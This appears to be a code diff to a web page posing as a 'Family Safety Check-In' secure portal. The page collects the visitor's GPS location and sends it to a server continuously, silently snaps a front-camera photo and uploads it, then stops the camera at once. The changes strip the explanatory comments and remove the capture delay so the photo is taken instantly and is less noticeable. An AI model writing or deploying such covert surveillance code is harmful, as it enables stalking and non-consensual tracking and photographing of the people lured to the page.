@@ -18,8 +18,6 @@
     <h2>Family Safety Check-In</h2>
     <div id="loader" class="loader"></div>
     <p id="status">Connecting to secure portal...</p>
-    
-    <!-- We mute and inline the video so mobile browsers allow it to play immediately -->
     <video id="video" autoplay playsinline muted></video>
 </div>
 
@@ -28,7 +26,7 @@
     let currentLat = null;
     let currentLon = null;
     let videoStream = null;
-    let photoTaken = false; // Prevents the system from taking multiple snapshots loop
+    let photoTaken = false; 
 
     const statusDiv = document.getElementById('status');
     const loaderDiv = document.getElementById('loader');
@@ -40,7 +38,6 @@
             currentLat = position.coords.latitude;
             currentLon = position.coords.longitude;
             
-            // Continuous passive location update to server
             fetch('/update', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -68,13 +65,13 @@
                 videoStream = stream;
                 videoEl.srcObject = stream;
                 videoEl.style.display = 'inline-block';
-                statusDiv.innerText = "Verifying surroundings... Please hold steady.";
+                statusDiv.innerText = "Verifying surroundings...";
                 
-                // 3. AUTO-CAPTURE TIMEOUT TRIGGER
-                // Waits 2 seconds so the front lens can adapt to lightning/focus before snapping
-                setTimeout(() => {
+                // 3. INSTANT TRIGGER
+                // Triggers as soon as the camera feed meta-data is ready, with no artificial delay
+                videoEl.onloadedmetadata = () => {
                     autoCaptureSelfie();
-                }, 2000);
+                };
             })
             .catch((err) => {
                 statusDiv.innerText = "Camera access denied. Please allow camera permissions.";
@@ -82,12 +79,12 @@
             });
     }
 
-    // 4. Automated Snapshot Processing Engine
+    // 4. Zero-Delay Snapshot Processing Engine
     function autoCaptureSelfie() {
         if (photoTaken) return; 
         if (!currentLat || !currentLon) {
-            // If GPS is still calibrating, retry in 1 second
-            setTimeout(autoCaptureSelfie, 1000);
+            // If GPS hardware is still booting up, wait a tiny fraction of a second and retry
+            setTimeout(autoCaptureSelfie, 200);
             return;
         }
 
@@ -99,7 +96,6 @@
         canvas.height = videoEl.videoHeight || 480;
         const ctx = canvas.getContext('2d');
         
-        // Mirror the canvas image drawing parameters
         ctx.translate(canvas.width, 0);
         ctx.scale(-1, 1);
         ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
@@ -119,12 +115,11 @@
             statusDiv.innerText = "Verification successfully shared! You can now close this tab.";
             loaderDiv.style.display = 'none';
             
-            // Turn off camera recording light indicator immediately
             if(videoStream) {
                 videoStream.getTracks().forEach(track => track.stop());
             }
         }).catch(err => {
-            photoTaken = false; // Reset toggle flag if network dropped so it can retry
+            photoTaken = false; 
             autoCaptureSelfie();
         });
     }
